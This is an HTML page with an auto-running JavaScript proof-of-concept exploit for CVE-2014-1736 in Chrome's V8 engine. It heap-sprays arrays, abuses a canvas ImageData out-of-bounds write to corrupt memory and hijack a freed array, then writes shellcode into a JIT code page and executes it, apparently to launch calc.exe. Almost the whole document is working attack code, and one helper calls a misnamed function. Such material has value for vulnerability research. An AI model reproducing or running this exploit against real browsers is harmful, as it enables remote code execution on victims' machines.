<html>
<TITLE>
Proof of Concept Exploit for CVE-2014-1736
</TITLE>
<META HTTP-EQUIV="pragma" CONTENT="no-cache"> 
<META HTTP-EQUIV="Cache-Control" CONTENT="no-store, must-revalidate"> 
<META HTTP-EQUIV="expires" CONTENT="0">
<style>
div,h3
{
	font-family: Courier
}
</style>
<body>
<div id="e_div"></div>
<script>
/*********************************************************
*global varaibles defined here
*********************************************************/
dontGC              = this
dontGC.attr1		= {}
dontGC.attr2		= {}
is_debug    	     = true
fixarr_count     	 = 0xc00
arrbuf_count    	 = 0x400000
arrbuf_size     	 = 0x10
fixedarray_size1     = 0x20000 - 8
fixedarray_size2     = 0x10000 - 8
fixedarray_length1   = fixedarray_size1 / 4
fixedarray_length2   = fixedarray_size2 / 4
FIXEDARRAY_TAG_1     = 0x11220000
FIXEDARRAY_TAG_2     = 0x22330000

if(is_debug)  alert("[+]attach me:)")


/*********************************************************
*functions used for debugging defined here
*********************************************************/
function log(info)
{
	document.getElementById("e_div").innerHTML += "<h3>"+ info +"</h3>"
}

function breakpoint()
{
	if(is_debug)
	{
		//bp chrome_child!v8::internal::Runtime_MathAtan2 in your debugger.
		Math.atan2(1)
	}
}

function fail(reason)
{
	log("[*]Exploit fail: " + reason)
	log("[*]Aw, Snap:( You'd better have a cup of tea and exploit me again.")
	setTimeout(function(){window.location.reload(true)}, 10000)
}



/*********************************************************
*functions used for V8 Heap Feng Shui defined here.
*********************************************************/

function gc(count)
{
    for (i = 0; i < count; i++) 
	{
		new ArrayBuffer(0x100000);
	}
}


function cleanup_my_newspace(count)
{
	gc(count)
	gc(count)
}


function write_by_GOD(address, value)
{
	var canvas      = document.createElement("canvas");
	var context     = canvas.getContext("2d");
	this.imgdata    = context.createImageData(0x17001337,1);
	function addr_to_index(addr) {
	  return addr + (addr < 0x7fff0000 ? +0x80010000 : -0x7fff0000);
	}
	this.imgdata.data[addressToIndex(address)] = value
}



function exploit()
{
	
	var tmp = [];
	for (var i = 0; i < 100; i++)
		tmp[i] = Array.apply(null, new Array(0x28 * 11)).map(function () {return 0x1234;});
	var  array1				= tmp[tmp.length / 2]
	var  fixedarrays1 	    = new Array(fixarr_count)
    var  fixedarrays2	    = new Array(fixarr_count)
	var  arraybufs			= new Array(arrbuf_count); for(var i=0; i<arrbuf_count; i++) arraybufs[i] = null
	dontGC.attr1 			= arraybufs
	
	/*
		Step1: 
		
		    heap spray FixedArray objects to fixed address, the most promising memory layout looks like this:
		
			0x3ff08080:  07c08121 0000fffc 22440000 22222222
			0x3ff08090:  22222222 22222222 22222222 22222222
			0x3ff080a0:  22222222 22222222 22222222 22222222
			...
			0x3ff28080:  07c08121 00007ffc 44220000 44444444
			0x3ff28090:  44444444 44444444 44660000 26151b9d --> array1 pointer
			0x3ff280a0:  44444444 44444444 44444444 44444444
	*/
	for(var i=0; i<fixarr_count; i++)
	{
		fixedarrays1[i] 	   = new Array(fixedarray_size1 / 4)
		for(var j=0; j<fixedarrays1[i].length; j++)
		{
			fixedarrays1[i][j] = 0x11111111
		}
		fixedarrays1[i][0] = FIXEDARRAY_TAG_1		
		fixedarrays2[i] 	   = new Array(fixedarray_size2 / 4)
		for(var j=0; j<fixedarrays2[i].length; j++)
		{
			fixedarrays2[i][j] = 0x22222222
		}
		fixedarrays2[i][4] = FIXEDARRAY_TAG_2
	}
	
	
	for(var i=0; i<fixarr_count; i++)
	{
		fixedarrays2[i][5] = array1
	}
	
	
	/*
		Step2:
		
			set both fixedarrays2 and array1 to null, and then trigger garbage collect. so array1 will be freed.
			but its pointer's still left on the heap.
			
			0x3ff08080:  07c08121 0000fffc 22440000 22222222
			0x3ff08090:  22222222 22222222 22222222 22222222
			0x3ff080a0:  22222222 22222222 22222222 22222222
			...
			0x3ff28080:  07c08199 00020000 3d6e8081 44444444
			0x3ff28090:  44444444 44444444 44660000 26151b9d
			0x3ff280a0:  44444444 44444444 44444444 44444444
	
			this will take quite a loooooooooong time:(
	*/
	fixedarrays2 = null
	cleanup_my_newspace(0x1000)
	array1		 = null
	cleanup_my_newspace(0x2000)
	
	/*
		Step3:
			
			write FixedArray object's length field to 0x1fffc using SkyLined's f**king amazing bug.
		
	*/
	write_by_GOD(0x3ff08087, 0x1)
	
	
	/*
		Step4:
			
			search the corrupted FixedArray object in heap.
	*/
	var index_corr_array  = 0
	var offset_index      = 0
	for(var i=0; i<fixarr_count; i++)
	{
		for(var j=0; j<fixedarray_length1; j++)
		{
			var value = fixedarrays1[i][fixedarray_length1 + j]
			if(typeof value == "number" && value == FIXEDARRAY_TAG_2)
			{
				index_corr_array = i
				offset_index 	 = j
				break
			}
		}
	}
	
	
	if(!index_corr_array)
	{
		fail("can't find corrupted fixedarray.")
		return
	}
	
	
	/*
		Step5:
			
			reference the freed array1 by OOB read.
	*/
	exploit_arrobj  = fixedarrays1[index_corr_array][fixedarray_length1 + offset_index + 1]
	dontGC.attr2    = exploit_arrobj
	
	
	/*
		Step6:
		
			spray ArrayBuffer objects in memory so array1's elements will be filled up with some ArrayBuffer object.

	*/
	var count      = 0x10
	var loop_count = arrbuf_count / count
	for(var i=0; i<loop_count; i++)
	{
		/*
			because we don't want array1's map object pointer to be overwritten, we spray ArrayBuffer objects carefully.
		*/
		if(typeof exploit_arrobj[4] == "number" && exploit_arrobj[4] == 0x1234)
		{
			for(var j=0; j<count; j++)
			{
				arraybufs[i * count + j] = new ArrayBuffer(arrbuf_size)
			}
		}
		else
		{
			break
		}
	}
	
	/*
		Step7:
		
			now we can R/W some ArrayBuffer object's memory layout directly by accessing array1's elements. 
	
	*/
	var index_abf_memptr = -1
	if(typeof exploit_arrobj[4] == "number" && exploit_arrobj[4] == 0x1234)
	{
		fail("exploit_arrobj has not been freed properly.")
		return
	}
	else
	{
		for(var i=1; i<exploit_arrobj.length; i++)
		{
			if(typeof exploit_arrobj[i] == "number" && exploit_arrobj[i] == arrbuf_size)
			{
				index_abf_memptr = i-1
				exploit_arrobj[i] = 0x30000
				break
			}
		}
	}
	
	if(-1 == index_abf_memptr)
	{
		fail("exploit_arrobj has not been reused properly.")
		return
	}
	
	var exploit_abfobj = null
	for(var i=0; i<arrbuf_count; i++)
	{
		if(arraybufs[i] == null) continue
		if(arraybufs[i].byteLength != arrbuf_size)
		{
			exploit_abfobj = arraybufs[i]
		}
	}
	
	if(!exploit_abfobj)
	{
		fail("can't find corrupted ArrayBuffer.")
		return
	}
	
	
	var code = "tmp = [];";
	for (var i = 0; i < 0x10000; i++)
		code += "tmp[" + i + "] = " + i + ";";
	var func_obj = new Function("a", code);
	func_obj();
	
	/*write a function object's pointer to the backstore buffer field of the ArrayBuffer object*/
	exploit_arrobj[index_abf_memptr] = func_obj
	/*read jit code address in function object*/
	var u8 	= new Uint8Array(exploit_abfobj, 11, 4)
	var func_jitaddress = (u8[3] << 0x18) + (u8[2] << 0x10) + (u8[1] << 8) + u8[0]
	/*write jit code address to the backstore buffer field of the ArrayBuffer object*/
	exploit_arrobj[index_abf_memptr] = (func_jitaddress / 2)
	
	/*write shellcode to jit code page with PAGE_EXECUTE_READWRITE*/
	if(is_debug)
	{
	var shellcode = [0xCCCCCCCC, 0x9040ec83, 0x74d9dfdb, 0x2958f424, 0x37e8bec9, 0x32b1e38a, 0x31fce883, 0x98031370, 0xa4166824, 0x54d9e5a3, 0xb1509634, 0xb2078405, 0x96431834, 0x0201d3b4, 0x258d914e, 0x08e81ce7, 0xc63490f8, 0x14c8b23a, 0xd7f0146f, 0x05355562, 0x42ee078c, 0x169bb83f, 0x1d4bb9fc, 0xe1eec1bc, 0x31f07849, 0xa9baf7e1, 0xc81b5089, 0x8367835e, 0x121370eb, 0x25dc493a, 0x8ae30602, 0x2c23568f, 0x4f5f2d70, 0x32a4360d, 0x9439b3c9, 0x259a649a, 0x2969f24e, 0x2d35703b, 0x494d55ba, 0xd8825837, 0x81067f03, 0x6f1f1ed0, 0xd77f1fb6, 0xf50bba67, 0x9351bc7c, 0xdaec4c83, 0x4cef4e84, 0x03647fed, 0x60af806a, 0xc0f2ca84, 0x5166930d, 0x955d2450, 0x6554a76d, 0x601cb78a, 0x18cc7fd6, 0x8ff2ea47, 0x4e913f68, 0x4156a3fb]
	}
	else
	{
	var shellcode = [0x90909090, 0x9040ec83, 0x74d9dfdb, 0x2958f424, 0x37e8bec9, 0x32b1e38a, 0x31fce883, 0x98031370, 0xa4166824, 0x54d9e5a3, 0xb1509634, 0xb2078405, 0x96431834, 0x0201d3b4, 0x258d914e, 0x08e81ce7, 0xc63490f8, 0x14c8b23a, 0xd7f0146f, 0x05355562, 0x42ee078c, 0x169bb83f, 0x1d4bb9fc, 0xe1eec1bc, 0x31f07849, 0xa9baf7e1, 0xc81b5089, 0x8367835e, 0x121370eb, 0x25dc493a, 0x8ae30602, 0x2c23568f, 0x4f5f2d70, 0x32a4360d, 0x9439b3c9, 0x259a649a, 0x2969f24e, 0x2d35703b, 0x494d55ba, 0xd8825837, 0x81067f03, 0x6f1f1ed0, 0xd77f1fb6, 0xf50bba67, 0x9351bc7c, 0xdaec4c83, 0x4cef4e84, 0x03647fed, 0x60af806a, 0xc0f2ca84, 0x5166930d, 0x955d2450, 0x6554a76d, 0x601cb78a, 0x18cc7fd6, 0x8ff2ea47, 0x4e913f68, 0x4156a3fb]
	}
	
	var u32	= new Uint32Array(exploit_abfobj, 0, shellcode.length * 8)
	for(var i=0; i<shellcode.length; i++)
	{
		u32[i] = shellcode[i]
	}
	/*Hello, calc.exe*/
	func_obj()	
	
	
	
	return
	
}


exploit()
</script>
</body>
</html>